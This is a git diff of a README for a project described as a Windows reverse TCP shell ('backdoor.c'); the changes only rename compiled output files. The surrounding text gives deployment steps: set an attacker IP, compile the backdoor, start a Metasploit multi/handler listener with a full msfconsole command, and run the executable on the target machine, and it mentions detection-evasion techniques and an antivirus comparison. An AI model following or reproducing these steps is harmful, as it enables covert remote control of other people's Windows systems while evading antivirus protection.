@@ -25,7 +25,7 @@ This project contains a simple, customizable reverse TCP shell for Windows syste
 ## Usage
 
 1. Replace `YOUR_IP_HERE` with your actual IP address
-2. Compile using `gcc -O2 backdoor.c -o github_gcc_test.exe` on a windows machine
+2. Compile using `gcc -O2 backdoor.c -o backdoor.exe` on a windows machine
 3. Set up a metasploit listener on your machine: `msfconsole -q -x "use exploit/multi/handler; set LHOST eth0; set LPORT 4444; set Payload generic/shell_reverse_tcp; run -j"`
 4. Run the executable on the target Windows machine
 
@@ -60,7 +60,7 @@ The code uses several techniques to minimize detection and maintain compatibilit
 To compile with TDM-GCC:
 
 ```bash
-gcc -O2 backdoor.c -o backdoor_tdm.exe -mwindows
+gcc -O2 backdoor.c -o backdoor.exe
 ```
 
 ## AV Detection Comparison
